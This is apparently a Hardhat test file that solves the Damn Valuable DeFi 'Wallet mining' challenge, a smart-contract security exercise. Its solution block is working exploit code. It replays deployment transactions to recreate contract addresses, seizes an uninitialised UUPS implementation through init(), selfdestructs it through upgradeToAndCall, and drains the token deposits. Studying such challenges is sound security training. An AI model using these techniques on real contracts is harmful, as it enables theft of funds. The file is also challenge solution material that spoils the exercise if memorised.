const { ethers, upgrades } = require('hardhat');
const { expect, assert } = require('chai');
const { Copy, Upgrade, Factory } = require('./deployment.json');

async function transactionToRaw(tx) {
    const txData = {
        nonce: tx.nonce,
        gasPrice: tx.gasPrice,
        gasLimit: tx.gasLimit,
        to: tx.to,
        value: tx.value,
        data: tx.data,
        chainId: tx.chainId
    };
    const txSignature = {
        v: tx.v,
        r: tx.r,
        s: tx.s
    }
    const txRaw = ethers.utils.serializeTransaction(txData, txSignature);
    assert.strictEqual(ethers.utils.keccak256(txRaw), tx.hash);
    return txRaw;
}

async function getTransaction(txHash) {
    const provider = ethers.getDefaultProvider('mainnet');
    console.log(txHash);
    tx = await provider.getTransaction(txHash);
    // console.log(tx);
    if (tx) {
        rawTx = await transactionToRaw(tx);
        return rawTx;
    }
    return null;
}

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9B6fb606A9f5789444c17768c6dFCF2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;
        // await walletDeployer.can(walletDeployer.address, DEPOSIT_ADDRESS);

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const SAFE_DEPLOYER_ADDRESS = '0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A';
        expect(await ethers.utils.getContractAddress({ from: SAFE_DEPLOYER_ADDRESS, nonce: 2 })).to.eq(await walletDeployer.fact());
        expect(await ethers.utils.getContractAddress({ from: SAFE_DEPLOYER_ADDRESS, nonce: 0 })).to.eq(await walletDeployer.copy());

        await player.sendTransaction({
            to: SAFE_DEPLOYER_ADDRESS,
            value: ethers.utils.parseEther('1'),
        });

        // const SAFE_MASTERCOPY_DEPLOYMENT_TX = '0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3'
        // rawTx = await getTransaction(SAFE_MASTERCOPY_DEPLOYMENT_TX);
        // expect(rawTx).not.to.be.null;
        await ethers.provider.sendTransaction(Copy);

        // const SAFE_SET_IMPL_TX = '0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4'
        // rawTx = await getTransaction(SAFE_SET_IMPL_TX);
        // expect(rawTx).not.to.be.null;
        await ethers.provider.sendTransaction(Upgrade);

        // const SAFE_FACTORY_DEPLOYMENT_TX = '0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261';
        // rawTx = await getTransaction(SAFE_FACTORY_DEPLOYMENT_TX);
        // expect(rawTx).not.to.be.null;
        await ethers.provider.sendTransaction(Factory);

        const SAFE_FACTORY_ADDRESS = await walletDeployer.fact();
        for (let i = 1; i < 100; i++) {
            addr = ethers.utils.getContractAddress({
                from: SAFE_FACTORY_ADDRESS,
                nonce: i,
            });
            if (addr === DEPOSIT_ADDRESS) {
                console.log("Deposit target address", addr, "recreated");
                console.log("Deposit deployment nonce", i);
                break;
            }
        }

        console.log("Deposit balance:", ethers.utils.formatEther(await token.balanceOf(DEPOSIT_ADDRESS)));
        const walletAttacker = await (await ethers.getContractFactory('WalletAttacker', player)).deploy(token.address);
        await walletAttacker.attackWithPayment();
        console.log("Player balance:", ethers.utils.formatEther(await token.balanceOf(player.address)));
        console.log("Deposit balance:", ethers.utils.formatEther(await token.balanceOf(DEPOSIT_ADDRESS)));

        const implSlot = ethers.BigNumber.from(ethers.utils.keccak256(ethers.utils.toUtf8Bytes('eip1967.proxy.implementation'))).sub(1).toHexString();
        console.log("impl slot:", implSlot);

        const implAddress = await ethers.provider.getStorageAt(authorizer.address, implSlot).then((s) => "0x" + s.slice(26));
        console.log("impl address:", implAddress);

        const implABI = [
            "function owner() public view returns (address)",
            "function init(address[] memory _wards, address[] memory _aims) external",
            "function upgradeToAndCall(address imp, bytes memory wat) external payable",
            "function can(address usr, address aim) external view returns (bool)"
        ];
        const impl = new ethers.Contract(implAddress, implABI, player);

        await impl.init([], []);
        console.log("impl owner:", await impl.owner());
        expect(await impl.owner()).to.eq(player.address);

        console.log("impl code size:", ((await ethers.provider.getCode(implAddress)).length - 2) / 2);

        console.log("can:", await walletDeployer.can(player.address, DEPOSIT_ADDRESS));

        const newImpl = await (await ethers.getContractFactory('NewImpl', player)).deploy();
        let abi = ["function selfDestruct()"];
        let iface = new ethers.utils.Interface(abi);
        let data = iface.encodeFunctionData("selfDestruct", []);
        await impl.upgradeToAndCall(newImpl.address, data);

        console.log("block:", await ethers.provider.getBlockNumber());

        console.log("authorizer (proxy) code size:", ((await ethers.provider.getCode(authorizer.address)).length - 2) / 2);

        console.log("impl code size:", ((await ethers.provider.getCode(implAddress)).length - 2) / 2);

        console.log("new impl code size:", ((await ethers.provider.getCode(newImpl.address)).length - 2) / 2);

        expect(
            await ethers.provider.getCode(implAddress)
        ).to.eq('0x');

        // console.log("can:", await impl.can(player.address, DEPOSIT_ADDRESS));
        console.log("can:", await walletDeployer.can(player.address, DEPOSIT_ADDRESS));


        for (let i = 0; i < 43; i++) {
            // console.log("block:", await ethers.provider.getBlockNumber());
            await walletDeployer.connect(player).drop([]);
            console.log("impl code size:", ((await ethers.provider.getCode(implAddress)).length - 2) / 2);
        }
        console.log(await token.balanceOf(player.address));


        // const authorizerAttacker = await (await ethers.getContractFactory('AuthorizerAttacker', player)).deploy();
        // await authorizerAttacker.attack(impl.address, walletDeployer.address);

        // console.log("impl owner:", await impl.owner());
        // expect(await impl.owner()).to.eq(authorizerAttacker.address);

        console.log("impl_slot at proxy:", await ethers.provider.getStorageAt(authorizer.address, implSlot).then((s) => "0x" + s.slice(26)));
        console.log("impl_slot at prev impl:", await ethers.provider.getStorageAt(implAddress, implSlot).then((s) => "0x" + s.slice(26)));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
